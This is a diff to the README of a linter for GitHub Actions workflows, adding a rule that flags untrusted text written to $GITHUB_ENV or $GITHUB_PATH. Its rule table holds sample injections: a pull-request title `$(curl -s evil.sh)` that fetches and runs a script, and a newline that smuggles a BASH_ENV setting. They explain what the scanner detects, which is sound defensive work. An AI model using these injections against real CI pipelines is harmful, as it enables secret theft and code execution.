@@ -28,6 +28,7 @@ deliberately small and readable: one file per concern, every rule explained belo
 | WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action, `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. Detours are followed too: `env:`, `$GITHUB_ENV`, `$GITHUB_OUTPUT` and job outputs (see below). |
 | WG005 | pull-request-target | low, or high with a PR checkout | `pull_request_target` runs with secrets even for pull requests from forks. Checking out the PR's head (`ref: ${{ github.event.pull_request.head.sha }}`, or a `refs/pull/...` ref) then runs a stranger's code with those secrets. |
 | WG006 | persisted-credentials | low | `actions/checkout` without `persist-credentials: false` leaves the token in `.git/config`, readable by every later step. |
+| WG007 | untrusted-github-env | high (medium for a composite action's inputs) | Untrusted text appended to `$GITHUB_ENV` or `$GITHUB_PATH` in `run:`, directly or through `env:`/shell variables (`echo "T=$TITLE" >> "$GITHUB_ENV"`). Every later step reads those files: a PR title with a line break such as `x` + newline + `BASH_ENV=/tmp/evil.sh` sets a variable that makes bash run the sender's script, and `$GITHUB_PATH` can put their directory first in `PATH`. No `${{ }}` in the script is needed for this, so WG004 alone doesn't catch it. Pass the value to the step that needs it via `env:` or a step output. |
 
 ### Actions too
 
@@ -268,7 +269,7 @@ be read or parsed, or bad arguments.
 ```
 src/workflow_guard/
   workflow.py  loading workflows and actions, node helpers, jobs/steps/triggers, inline ignores
-  rules.py     the six rules
+  rules.py     the seven rules
   expressions.py  ${{ }} lexer and context paths (used by WG004 and WG005)
   taint.py     WG004's tracker: untrusted values through env:, $GITHUB_ENV/OUTPUT, job outputs
   fix.py       --fix: GitHubResolver (API lookups), pin_actions (text edits), comment style
@@ -298,7 +299,7 @@ Ubuntu and Windows.
 - The expression reader only extracts property paths; it doesn't evaluate expressions or check
   operator precedence. A computed key (`github.event[matrix.field].title`) can't be resolved,
   so it isn't reported.
-- The detour tracking reads `>> $GITHUB_ENV` / `>> $GITHUB_OUTPUT` one line at a time: multi-line
+- The detour tracking (WG004, WG007) reads `>> $GITHUB_*` writes one line at a time: multi-line
   values (`name<<EOF` heredocs), `{ ...; } >> $GITHUB_OUTPUT` groups, `tee`, other shells' syntax
   and outputs set by actions (e.g. github-script's `core.setOutput`) aren't followed. Neither
   are outputs of reusable workflows or composite actions as seen by their callers.
